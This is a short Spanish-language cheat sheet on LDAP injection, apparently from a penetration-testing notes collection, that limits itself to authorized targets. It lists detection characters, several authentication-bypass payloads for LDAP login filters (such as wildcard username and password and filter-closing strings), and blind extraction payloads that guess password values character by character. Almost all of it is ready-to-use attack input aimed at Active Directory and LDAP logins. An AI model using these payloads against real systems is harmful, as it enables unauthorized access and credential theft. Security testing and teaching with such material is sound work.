# Cheatsheet · LDAP Injection

Explicación en `../../01-web/injection/ldap.md`. **Solo sobre objetivos autorizados.**

## Detección

```
*   (   )   |   &   \
```

## Bypass de autenticación

```
usuario: *        contraseña: *
*)(uid=*))(|(uid=*
admin)(&)
admin)(!(&(1=0
```

## Extracción (blind con comodines)

```
# inferir atributos carácter a carácter
admin*
admin)(|(password=a*)
admin)(|(password=b*)
```

## Notas

- Muy común en logins contra Active Directory / directorios LDAP.
- Ajusta a la estructura del filtro (uid, cn, sAMAccountName).
